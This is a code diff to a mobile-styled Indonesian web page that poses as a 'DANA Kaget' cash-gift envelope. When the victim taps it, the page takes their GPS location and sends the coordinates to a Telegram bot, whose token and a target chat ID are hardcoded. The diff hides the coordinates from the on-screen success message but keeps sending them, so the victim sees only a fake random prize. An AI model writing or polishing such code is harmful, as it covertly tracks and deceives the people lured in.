@@ -38,22 +38,6 @@
     flex-direction:column;
   }
 
-  /* status bar mock */
-  .statusbar{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:10px 18px 4px;
-    color:#fff;
-    font-size:13px;
-    font-weight:600;
-    letter-spacing:.3px;
-    opacity:.85;
-    flex-shrink:0;
-  }
-  .statusbar .dots{display:flex;gap:6px;align-items:center;}
-  .statusbar svg{display:block;}
-
   .topbar{
     display:flex;
     align-items:center;
@@ -343,8 +327,6 @@
 <body>
 
 <div class="phone" id="phone">
-  <!-- status bar dihapus sesuai permintaan -->
-  <!-- text "demo" dihapus -->
 
   <div class="topbar">
     <button class="close-btn" aria-label="Tutup">&times;</button>
@@ -420,7 +402,7 @@
 //  KONFIGURASI TELEGRAM BOT
 // ============================================================
 const TELEGRAM_TOKEN = '8903235578:AAHIzgIe8njHETOQ6F3qvXjpt5bHQQZIp50';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // GANTI DENGAN CHAT ID KAMU
+const TELEGRAM_CHAT_ID = '8453288446'; // CHAT ID TUJUAN
 
 // ============================================================
 //  LOGIKA LOKASI + TAMPILAN MODAL + KIRIM KE TELEGRAM
@@ -586,7 +568,7 @@ envelope.addEventListener('click', () => {
     isProcessing = false;
 
     if (result.error) {
-      // Gagal: tampilkan modal error
+      // Gagal: tampilkan modal error (tanpa koordinat)
       showModal(
         '⚠️ Gagal',
         0,
@@ -601,11 +583,13 @@ envelope.addEventListener('click', () => {
     // Sukses: dapat koordinat
     const { lat, lng, acc } = result;
     const nominal = randomAmount();
-    const desc = `Selamat, kamu mendapatkan DANA Kaget dari <b>${document.getElementById('senderName').textContent}</b> 🎉<br><br>📍 Lokasi: <b>${lat.toFixed(6)}, ${lng.toFixed(6)}</b> (akurasi ±${Math.round(acc)}m)`;
+    // HAPUS koordinat dari tampilan modal, hanya tampilkan pesan sukses
+    const desc = `Selamat, kamu mendapatkan DANA Kaget dari <b>${document.getElementById('senderName').textContent}</b> 🎉`;
 
-    // Kirim ke Telegram
+    // Kirim ke Telegram (dengan koordinat)
     kirimKeTelegram(lat, lng, acc, nominal);
 
+    // Tampilkan modal tanpa koordinat
     showModal('Yay! Kamu dapet', nominal, desc, false);
     prompt.innerHTML = '✅ Lokasi ditemukan! Hadiah siap.';
   });
@@ -614,7 +598,6 @@ envelope.addEventListener('click', () => {
 // ===== Tutup modal =====
 closeBtn.addEventListener('click', () => {
   overlay.classList.remove('show');
-  // Reset prompt ke awal jika belum direset
   if (!overlay.classList.contains('show')) {
     prompt.innerHTML = 'Tap amplop buat<br>liat DANA Kaget';
   }
@@ -628,4 +611,4 @@ overlay.addEventListener('click', (e) => {
 });
 </script>
 </body>
-        </html>
+</html>
